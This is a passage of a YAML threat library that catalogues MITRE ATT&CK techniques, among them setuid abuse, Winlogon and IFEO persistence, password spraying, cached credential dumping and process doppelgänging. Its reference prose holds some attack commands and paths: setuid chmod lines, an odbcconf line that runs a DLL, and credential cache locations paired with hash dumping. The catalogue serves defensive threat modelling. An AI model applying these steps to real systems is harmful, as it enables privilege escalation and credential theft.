      and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code>
      and <code>runas</code>.(Citation: Microsoft RunAs)


      Creating processes with a token not associated with the current user may require
      the credentials of the target user, specific privileges to impersonate that
      user, or access to the token to be used. For example, the token could be duplicated
      via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)
      or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003)
      before being used to create a process.


      While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001),
      the techniques can be used in conjunction where a token is duplicated and then
      used to create a new process.

      https://attack.mitre.org/techniques/T1134/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.001
    ref_id: T1548.001
    name: Setuid and Setgid
    description: "An adversary may abuse configurations where an application has the\
      \ setuid or setgid bits set in order to get code running in a different (and\
      \ possibly more privileged) user\u2019s context. On Linux or macOS, when the\
      \ setuid or setgid bits are set for an application binary, the application will\
      \ run with the privileges of the owning user or group respectively.(Citation:\
      \ setuid man page) Normally an application is run in the current user\u2019\
      s context, regardless of which user or group owns the application. However,\
      \ there are instances where programs need to be executed in an elevated context\
      \ to function properly, but the user running them may not have the specific\
      \ required privileges.\n\nInstead of creating an entry in the sudoers file,\
      \ which must be done by root, any user can specify the setuid or setgid flag\
      \ to be set for their own applications (i.e. [Linux and Mac File and Directory\
      \ Permissions Modification](https://attack.mitre.org/techniques/T1222/002)).\
      \ The <code>chmod</code> command can set these bits with bitmasking, <code>chmod\
      \ 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.\
      \ This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code>\
      \ and <code>chmod g+s</code> can be used.\n\nAdversaries can use this mechanism\
      \ on their own malware to make sure they're able to execute in elevated contexts\
      \ in the future.(Citation: OSX Keydnap malware) This abuse is often part of\
      \ a \"shell escape\" or other actions to bypass an execution environment with\
      \ restricted permissions.\n\nAlternatively, adversaries may choose to find and\
      \ target vulnerable binaries with the setuid or setgid bits already enabled\
      \ (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)).\
      \ The setuid and setguid bits are indicated with an \"s\" instead of an \"x\"\
      \ when viewing a file's attributes via <code>ls -l</code>. The <code>find</code>\
      \ command can also be used to search for such files. For example, <code>find\
      \ / -perm +4000 2>/dev/null</code> can be used to find files with setuid set\
      \ and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries\
      \ that have these bits set may then be abused by adversaries.(Citation: GTFOBins\
      \ Suid)\nhttps://attack.mitre.org/techniques/T1548/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.004
    ref_id: T1547.004
    name: Winlogon Helper DLL
    description: "Adversaries may abuse features of Winlogon to execute DLLs and/or\
      \ executables when a user logs in. Winlogon.exe is a Windows component responsible\
      \ for actions at logon/logoff as well as the secure attention sequence (SAS)\
      \ triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\\
      Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and\
      \ <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>\
      \ are used to manage additional helper programs and functionalities that support\
      \ Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications\
      \ to these Registry keys may cause Winlogon to load and execute malicious DLLs\
      \ and/or executables. Specifically, the following subkeys have been known to\
      \ be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\
      \n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon\
      \ events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization\
      \ program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe,\
      \ the system shell executed when a user logs on\n\nAdversaries may take advantage\
      \ of these features to repeatedly execute malicious code and establish persistence.\n\
      https://attack.mitre.org/techniques/T1547/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.003
    ref_id: T1021.003
    name: Distributed Component Object Model
    description: 'Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      to interact with remote machines by taking advantage of Distributed Component
      Object Model (DCOM). The adversary may then perform actions as the logged-on
      user.


      The Windows Component Object Model (COM) is a component of the native Windows
      application programming interface (API) that enables interaction between software
      objects, or executable code that implements one or more interfaces. Through
      COM, a client object can call methods of server objects, which are typically
      Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is
      transparent middleware that extends the functionality of COM beyond a local
      computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting
      COM June 2019)(Citation: Microsoft COM)


      Permissions to interact with local and remote server COM objects are specified
      by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide
      Com Keys) By default, only Administrators may remotely activate and launch COM
      objects through DCOM.(Citation: Microsoft COM ACL)


      Through DCOM, adversaries operating in the context of an appropriately privileged
      user can remotely obtain arbitrary and even direct shellcode execution through
      Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017)
      as well as other Windows objects that contain insecure methods.(Citation: Enigma
      MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can
      also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017)
      and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002)
      (DDE) execution directly through a COM created instance of a Microsoft Office
      application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing
      the need for a malicious document. DCOM can be used as a method of remotely
      interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).
      (Citation: MSDN WMI)

      https://attack.mitre.org/techniques/T1021/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1110.003
    ref_id: T1110.003
    name: Password Spraying
    description: 'Adversaries may use a single or small list of commonly used passwords
      against many different accounts to attempt to acquire valid account credentials.
      Password spraying uses one password (e.g. ''Password01''), or a small list of
      commonly used passwords, that may match the complexity policy of the domain.
      Logins are attempted with that password against many different accounts on a
      network to avoid account lockouts that would normally occur when brute forcing
      a single account with many passwords. (Citation: BlackHillsInfosec Password
      Spraying)


      Typically, management services over commonly used ports are used when password
      spraying. Commonly targeted services include the following:


      * SSH (22/TCP)

      * Telnet (23/TCP)

      * FTP (21/TCP)

      * NetBIOS / SMB / Samba (139/TCP & 445/TCP)

      * LDAP (389/TCP)

      * Kerberos (88/TCP)

      * RDP / Terminal Services (3389/TCP)

      * HTTP/HTTP Management Services (80/TCP & 443/TCP)

      * MSSQL (1433/TCP)

      * Oracle (1521/TCP)

      * MySQL (3306/TCP)

      * VNC (5900/TCP)


      In addition to management services, adversaries may "target single sign-on (SSO)
      and cloud-based applications utilizing federated authentication protocols,"
      as well as externally facing email applications, such as Office 365.(Citation:
      US-CERT TA18-068A 2018)


      In default environments, LDAP and Kerberos connection attempts are less likely
      to trigger events over SMB, which creates Windows "logon failure" event ID 4625.

      https://attack.mitre.org/techniques/T1110/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1090.002
    ref_id: T1090.002
    name: External Proxy
    description: 'Adversaries may use an external proxy to act as an intermediary
      for network communications to a command and control server to avoid direct connections
      to their infrastructure. Many tools exist that enable traffic redirection through
      proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040),
      ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries
      use these types of proxies to manage command and control communications, to
      provide resiliency in the face of connection loss, or to ride over existing
      trusted communications paths to avoid suspicion.


      External connection proxies are used to mask the destination of C2 traffic and
      are typically implemented with port redirectors. Compromised systems outside
      of the victim environment may be used for these purposes, as well as purchased
      infrastructure such as cloud-based resources or virtual private servers. Proxies
      may be chosen based on the low likelihood that a connection to them from a compromised
      system would be investigated. Victim systems would communicate directly with
      the external proxy on the Internet and then the proxy would forward communications
      to the C2 server.

      https://attack.mitre.org/techniques/T1090/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056.003
    ref_id: T1056.003
    name: Web Portal Capture
    description: 'Adversaries may install code on externally facing portals, such
      as a VPN login page, to capture and transmit credentials of users who attempt
      to log into the service. For example, a compromised login page may log provided
      user credentials before logging the user in to the service.


      This variation on input capture may be conducted post-compromise using legitimate
      administrative access as a backup measure to maintain network access through
      [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid
      Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial
      compromise by exploitation of the externally facing web service.(Citation: Volexity
      Virtual Private Keylogging)

      https://attack.mitre.org/techniques/T1056/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1589.002
    ref_id: T1589.002
    name: Email Addresses
    description: 'Adversaries may gather email addresses that can be used during targeting.
      Even if internal instances exist, organizations may have public-facing email
      infrastructure and addresses for employees.


      Adversaries may easily gather email addresses, since they may be readily available
      and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated
      via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)),
      such as probing and analyzing responses from authentication services that may
      reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example,
      adversaries may be able to enumerate email addresses in Office 365 environments
      by querying a variety of publicly available API endpoints, such as autodiscover
      and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation:
      Azure Active Directory Reconnaisance)


      Gathering this information may reveal opportunities for other forms of reconnaissance
      (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)),
      and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)
      or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote
      Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1589/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1598.004
    ref_id: T1598.004
    name: Spearphishing Voice
    description: 'Adversaries may use voice communications to elicit sensitive information
      that can be used during targeting. Spearphishing for information is an attempt
      to trick targets into divulging information, frequently credentials or other
      actionable information. Spearphishing for information frequently involves social
      engineering techniques, such as posing as a source with a reason to collect
      information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656))
      and/or creating a sense of urgency or alarm for the recipient.


      All forms of phishing are electronically delivered social engineering. In this
      scenario, adversaries use phone calls to elicit sensitive information from victims.
      Known as voice phishing (or "vishing"), these communications can be manually
      executed by adversaries, hired call centers, or even automated via robocalls.
      Voice phishers may spoof their phone number while also posing as a trusted entity,
      such as a business partner or technical support staff.(Citation: BOA Telephone
      Scams)


      Victims may also receive phishing messages that direct them to call a phone
      number ("callback phishing") where the adversary attempts to collect confidential
      information.(Citation: Avertium callback phishing)


      Adversaries may also use information from previous reconnaissance efforts (ex:
      [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or
      [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to
      tailor pretexts to be even more persuasive and believable for the victim.

      https://attack.mitre.org/techniques/T1598/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.005
    ref_id: T1003.005
    name: Cached Domain Credentials
    description: "Adversaries may attempt to access cached domain credentials used\
      \ to allow authentication to occur in the event a domain controller is unavailable.(Citation:\
      \ Microsoft - Cached Creds)\n\nOn Windows Vista and newer, the hash format is\
      \ DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2\
      \ hash.(Citation: PassLib mscache) The number of default cached credentials\
      \ varies and can be altered per system. This hash does not allow pass-the-hash\
      \ style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002)\
      \ to recover the plaintext password.(Citation: ired mscache)\n\nOn Linux systems,\
      \ Active Directory credentials can be accessed through caches maintained by\
      \ software like System Security Services Daemon (SSSD) or Quest Authentication\
      \ Services (formerly VAS). Cached credential hashes are typically located at\
      \ `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb`\
      \ for Quest. Adversaries can use utilities, such as `tdbdump`, on these database\
      \ files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002)\
      \ to obtain the plaintext password.(Citation: Brining MimiKatz to Unix) \n\n\
      With SYSTEM or sudo access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002),\
      \ [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows\
      \ or Linikatz for Linux can be used to extract the cached credentials.(Citation:\
      \ Brining MimiKatz to Unix)\n\nNote: Cached credentials for Windows Vista are\
      \ derived using PBKDF2.(Citation: PassLib mscache)\nhttps://attack.mitre.org/techniques/T1003/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.004
    ref_id: T1098.004
    name: SSH Authorized Keys
    description: "Adversaries may modify the SSH <code>authorized_keys</code> file\
      \ to maintain persistence on a victim host. Linux distributions and macOS commonly\
      \ use key-based authentication to secure the authentication process of SSH sessions\
      \ for remote management. The <code>authorized_keys</code> file in SSH specifies\
      \ the SSH keys that can be used for logging into the user account for which\
      \ the file is configured. This file is usually found in the user's home directory\
      \ under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized\
      \ Keys) Users may edit the system\u2019s SSH config file to modify the directives\
      \ PubkeyAuthentication and RSAAuthentication to the value \u201Cyes\u201D to\
      \ ensure public key and RSA authentication are enabled. The SSH config file\
      \ is usually located under <code>/etc/ssh/sshd_config</code>.\n\nAdversaries\
      \ may modify SSH <code>authorized_keys</code> files directly with scripts or\
      \ shell commands to add their own adversary-supplied public keys. In cloud environments,\
      \ adversaries may be able to modify the SSH authorized_keys file of a particular\
      \ virtual machine via the command line interface or rest API. For example, by\
      \ using the Google Cloud CLI\u2019s \u201Cadd-metadata\u201D command an adversary\
      \ may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation:\
      \ Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update\
      \ the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation:\
      \ Azure Update Virtual Machines) This ensures that an adversary possessing the\
      \ corresponding private key may log in as an existing user via SSH.(Citation:\
      \ Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead\
      \ to privilege escalation where the virtual machine or instance has distinct\
      \ permissions from the requesting user.\n\nWhere authorized_keys files are modified\
      \ via cloud APIs or command line interfaces, an adversary may achieve privilege\
      \ escalation on the target virtual machine if they add a key to a higher-privileged\
      \ user. \n\nSSH keys can also be added to accounts on network devices, such\
      \ as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)\nhttps://attack.mitre.org/techniques/T1098/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.006
    ref_id: T1590.006
    name: Network Security Appliances
    description: 'Adversaries may gather information about the victim''s network security
      appliances that can be used during targeting. Information about network security
      appliances may include a variety of details, such as the existence and specifics
      of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries
      may also target information about victim network-based intrusion detection systems
      (NIDS) or other appliances related to defensive cybersecurity operations.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation:
      Nmap Firewalls NIDS) Information about network security appliances may also
      be exposed to adversaries via online or other accessible data sets (ex: [Search
      Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering
      this information may reveal opportunities for other forms of reconnaissance
      (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1590/006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.012
    ref_id: T1546.012
    name: Image File Execution Options Injection
    description: "Adversaries may establish persistence and/or elevate privileges\
      \ by executing malicious content triggered by Image File Execution Options (IFEO)\
      \ debuggers. IFEOs enable a developer to attach a debugger to an application.\
      \ When a process is created, a debugger present in an application\u2019s IFEO\
      \ will be prepended to the application\u2019s name, effectively launching the\
      \ new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>).\
      \ (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly\
      \ via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft\
      \ GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in\
      \ the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows\
      \ NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where\
      \ <code>&lt;executable&gt;</code> is the binary on which the debugger is attached.\
      \ (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary\
      \ monitor program to be launched when a specified program silently exits (i.e.\
      \ is prematurely terminated by itself or a second, non kernel-mode process).\
      \ (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO\
      \ APR 2018) Similar to debuggers, silent exit monitoring can be enabled through\
      \ GFlags and/or by directly modifying IFEO and silent process exit Registry\
      \ values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\
      SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017)\
      \ (Citation: Oddvar Moe IFEO APR 2018)\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008),\
      \ on Windows Vista and later as well as Windows Server 2008 and later, a Registry\
      \ key may be modified that configures \"cmd.exe,\" or another program that provides\
      \ backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe).\
      \ After the Registry is modified, pressing the appropriate key combination at\
      \ the login screen while at the keyboard or when connected with [Remote Desktop\
      \ Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"\
      debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury\
      \ 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055),\
      \ these values may also be abused to obtain privilege escalation by causing\
      \ a malicious executable to be loaded and run in the context of separate processes\
      \ on the computer. (Citation: Elastic Process Injection July 2017) Installing\
      \ IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\
      \nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562)\
      \ by registering invalid debuggers that redirect and effectively disable various\
      \ system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec\
      \ Ushedix June 2008)\nhttps://attack.mitre.org/techniques/T1546/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.008
    ref_id: T1218.008
    name: Odbcconf
    description: 'Adversaries may abuse odbcconf.exe to proxy execution of malicious
      payloads. Odbcconf.exe is a Windows utility that allows you to configure Open
      Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft
      odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.


      Adversaries may abuse odbcconf.exe to bypass application control solutions that
      do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010),
      odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs
      (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;</code>).
      (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation:
      TrendMicro Cobalt Group Nov 2017)

      https://attack.mitre.org/techniques/T1218/008'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1593.002
    ref_id: T1593.002
    name: Search Engines
    description: 'Adversaries may use search engines to collect information about
      victims that can be used during targeting. Search engine services typical crawl
      online sites to index context and may provide users with specialized syntax
      to search for specific keywords or specific types of content (i.e. filetypes).(Citation:
      SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)


      Adversaries may craft various search engine queries depending on what information
      they seek to gather. Threat actors may use search engines to harvest general
      information about victims, as well as use specialized queries to look for spillages/leaks
      of sensitive information such as network details or credentials. Information
      from these sources may reveal opportunities for other forms of reconnaissance
      (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or
      [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)),
      establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
      or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or
      initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      or [Phishing](https://attack.mitre.org/techniques/T1566)).

      https://attack.mitre.org/techniques/T1593/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1591.002
    ref_id: T1591.002
    name: Business Relationships
    description: "Adversaries may gather information about the victim's business relationships\
      \ that can be used during targeting. Information about an organization\u2019\
      s business relationships may include a variety of details, including second\
      \ or third-party organizations/domains (ex: managed service providers, contractors,\
      \ etc.) that have connected (and potentially elevated) network access. This\
      \ information may also reveal supply chains and shipment paths for the victim\u2019\
      s hardware and software resources.\n\nAdversaries may gather this information\
      \ in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
      \ Information about business relationships may also be exposed to adversaries\
      \ via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:\
      \ ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities\
      \ for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)\
      \ or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),\
      \ establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)\
      \ or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or\
      \ initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195),\
      \ [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted\
      \ Relationship](https://attack.mitre.org/techniques/T1199)).\nhttps://attack.mitre.org/techniques/T1591/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1548.005
    ref_id: T1548.005
    name: Temporary Elevated Cloud Access
    description: "Adversaries may abuse permission configurations that allow them\
      \ to gain temporarily elevated access to cloud resources. Many cloud environments\
      \ allow administrators to grant user or service accounts permission to request\
      \ just-in-time access to roles, impersonate other accounts, pass roles onto\
      \ resources and services, or otherwise gain short-term access to a set of privileges\
      \ that may be distinct from their own. \n\nJust-in-time access is a mechanism\
      \ for granting additional roles to cloud accounts in a granular, temporary manner.\
      \ This allows accounts to operate with only the permissions they need on a daily\
      \ basis, and to request additional permissions as necessary. Sometimes just-in-time\
      \ access requests are configured to require manual approval, while other times\
      \ the desired permissions are automatically granted.(Citation: Azure Just in\
      \ Time Access 2023)\n\nAccount impersonation allows user or service accounts\
      \ to temporarily act with the permissions of another account. For example, in\
      \ GCP users with the `iam.serviceAccountTokenCreator` role can create temporary\
      \ access tokens or sign arbitrary payloads with the permissions of a service\
      \ account, while service accounts with domain-wide delegation permission are\
      \ permitted to impersonate Google Workspace accounts.(Citation: Google Cloud\
      \ Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation\
      \ Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation:\
      \ Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange\
      \ Online, the `ApplicationImpersonation` role allows a service account to use\
      \ the permissions associated with specified user accounts.(Citation: Microsoft\
      \ Impersonation and EWS in Exchange) \n\nMany cloud environments also include\
      \ mechanisms for users to pass roles to resources that allow them to perform\
      \ tasks and authenticate to other services. While the user that creates the\
      \ resource does not directly assume the role they pass to it, they may still\
      \ be able to take advantage of the role's access -- for example, by configuring\
      \ the resource to perform certain actions with the permissions it has been granted.\
      \ In AWS, users with the `PassRole` permission can allow a service they create\
      \ to assume a given role, while in GCP, users with the `iam.serviceAccountUser`\
      \ role can attach a service account to a resource.(Citation: AWS PassRole)(Citation:\
      \ Google Cloud Service Account Authentication Roles)\n\nWhile users require\
      \ specific role assignments in order to use any of these features, cloud administrators\
      \ may misconfigure permissions. This could result in escalation paths that allow\
      \ adversaries to gain access to resources beyond what was originally intended.(Citation:\
      \ Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS\
      \ Privilege Escalation)\n\n**Note:** this technique is distinct from [Additional\
      \ Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves\
      \ assigning permanent roles to accounts rather than abusing existing permissions\
      \ structures to gain temporarily elevated access to resources. However, adversaries\
      \ that compromise a sufficiently privileged account may grant another account\
      \ they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)\
      \ that would allow them to also abuse these features. This may also allow for\
      \ greater stealth than would be had by directly using the highly privileged\
      \ account, especially when logs do not clarify when role impersonation is taking\
      \ place.(Citation: CrowdStrike StellarParticle January 2022)\nhttps://attack.mitre.org/techniques/T1548/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1125
    ref_id: T1125
    name: Video Capture
    description: 'An adversary can leverage a computer''s peripheral devices (e.g.,
      integrated cameras or webcams) or applications (e.g., video call services) to
      capture video recordings for the purpose of gathering information. Images may
      also be captured from devices or applications, potentially in specified intervals,
      in lieu of video files.


      Malware or scripts may be used to interact with the devices through an available
      API provided by the operating system or an application to capture video or images.
      Video or image files may be written to disk and exfiltrated later. This technique
      differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due
      to use of specific devices or applications for video recording rather than capturing
      the victim''s screen.


      In macOS, there are a few different malware samples that record the user''s
      webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)

      https://attack.mitre.org/techniques/T1125'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.013
    ref_id: T1055.013
    name: "Process Doppelg\xE4nging"
    description: "Adversaries may inject malicious code into process via process doppelg\xE4\
      nging in order to evade process-based defenses as well as possibly elevate privileges.\
      \ Process doppelg\xE4nging is a method of executing arbitrary code in the address\
      \ space of a separate live process. \n\nWindows Transactional NTFS (TxF) was\
      \ introduced in Vista as a method to perform safe file operations. (Citation:\
      \ Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle\
      \ to write to a file at a given time. Until the write handle transaction is\
      \ terminated, all other handles are isolated from the writer and may only read\
      \ the committed version of the file that existed at the time the handle was\
      \ opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF\
      \ performs an automatic rollback if the system or application fails during a\
      \ write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated,\
      \ the TxF application programming interface (API) is still enabled as of Windows\
      \ 10. (Citation: BlackHat Process Doppelg\xE4nging Dec 2017)\n\nAdversaries\
      \ may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055).\
      \ Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012),\
      \ process doppelg\xE4nging involves replacing the memory of a legitimate process,\
      \ enabling the veiled execution of malicious code that may evade defenses and\
      \ detection. Process doppelg\xE4nging's use of TxF also avoids the use of highly-monitored\
      \ API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>,\
      \ and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelg\xE4\
      nging Dec 2017)\n\nProcess Doppelg\xE4nging is implemented in 4 steps (Citation:\
      \ BlackHat Process Doppelg\xE4nging Dec 2017):\n\n* Transact \u2013 Create a\
      \ TxF transaction using a legitimate executable then overwrite the file with\
      \ malicious code. These changes will be isolated and only visible within the\
      \ context of the transaction.\n* Load \u2013 Create a shared section of memory\
      \ and load the malicious executable.\n* Rollback \u2013 Undo changes to original\
      \ executable, effectively removing malicious code from the file system.\n* Animate\
      \ \u2013 Create a process from the tainted section of memory and initiate execution.\n\
      \nThis behavior will likely not result in elevated privileges since the injected\
      \ process was spawned from (and thus inherits the security context) of the injecting\
      \ process. However, execution via process doppelg\xE4nging may evade detection\
      \ from security products since the execution is masked under a legitimate process.\n\
      https://attack.mitre.org/techniques/T1055/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1016
    ref_id: T1016
    name: System Network Configuration Discovery
    description: 'Adversaries may look for details about the network configuration
      and settings, such as IP and/or MAC addresses, of systems they access or through
      information discovery of remote systems. Several operating system administration
      utilities exist that can be used to gather this information. Examples include
      [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101),
      [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).


      Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      on network devices to gather information about configurations and settings,
      such as IP addresses of configured interfaces and static/dynamic routes (e.g.
      <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation:
      Mandiant APT41 Global Intrusion )


      Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016)
      during automated discovery to shape follow-on behaviors, including determining
      certain access within the target network and what actions to do next.

      https://attack.mitre.org/techniques/T1016'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.003
    ref_id: T1578.003
    name: Delete Cloud Instance
    description: 'An adversary may delete a cloud instance after they have performed
      malicious activities in an attempt to evade detection and remove evidence of
      their presence.  Deleting an instance or virtual machine can remove valuable
      forensic artifacts and other evidence of suspicious behavior if the instance
      is not recoverable.


      An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002)
      and later terminate the instance after achieving their objectives.(Citation:
      Mandiant M-Trends 2020)

      https://attack.mitre.org/techniques/T1578/003'
